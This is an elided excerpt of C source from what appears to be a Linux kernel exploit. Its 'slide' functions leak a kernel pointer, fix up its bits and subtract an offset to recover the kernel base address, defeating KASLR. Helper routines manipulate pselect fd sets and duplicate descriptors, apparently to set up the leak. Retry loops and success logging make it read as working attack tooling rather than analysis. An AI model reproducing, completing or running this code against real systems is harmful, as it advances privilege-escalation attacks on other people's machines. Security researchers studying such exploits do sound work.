...
#ifdef FAST_MODE
#define SLIDE_WAIT_SECONDS 15
#else
#define SLIDE_WAIT_SECONDS 30
#endif
#endif
#ifndef SLIDE_ROUTE_POLL_USEC
#ifdef FAST_MODE
#define SLIDE_ROUTE_POLL_USEC 2000
#else
#define SLIDE_ROUTE_POLL_USEC 10000
#endif
#endif
...
static void dup_selected_fdset_fds(
    const fd_set *in, const fd_set *out, const fd_set *ex, int read_fd) {
  ...
  for (int word = 0; word < words_per_set; word++) {
    ...
    if (base_fd + bits_per_word > SLIDE_PSELECT_NFDS) {
      int valid = SLIDE_PSELECT_NFDS - base_fd;
      if (valid <= 0) {
        break;
      }
      bits &= (1UL << valid) - 1UL;
...
void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  dup_selected_fdset_fds(in, out, ex, read_fd);
...
uint64_t slide_read_stext(void) {
  ...
  uint64_t leak_ptr = leaked;
  if ((leaked >> 48) != 0xffff) {
    uint64_t shifted =
        (leaked << 8) | (SLIDE_BOOTID_LEAK_VALUE_OFF & 0xffULL);
    if ((shifted >> 48) == 0xffff) {
      pr_success("slide boot_id_shifted_leak raw=%016llx fixed=%016llx\n",
                 (unsigned long long)leaked, (unsigned long long)shifted);
      leak_ptr = shifted;
    } else {
  ...
  uint64_t off = SLIDE_BOOTID_LEAK_VALUE_OFF;
  uint64_t stext = leak_ptr - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leak_ptr,
...
int slide_leak_kernel_base(void) {
  ...
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    ...
    pr_info("slide leak attempts=%d/%d elapsed_ms=%ld\n",
            attempt, SLIDE_MAX_ATTEMPTS, elapsed_ms);
  ...
  long elapsed_ms = (end.tv_sec - start.tv_sec) * 1000L +
                    (end.tv_nsec - start.tv_nsec) / 1000000L;
  pr_info("slide leak failed attempts=%d elapsed_ms=%ld\n",
          SLIDE_MAX_ATTEMPTS, elapsed_ms);
  return 0;
}
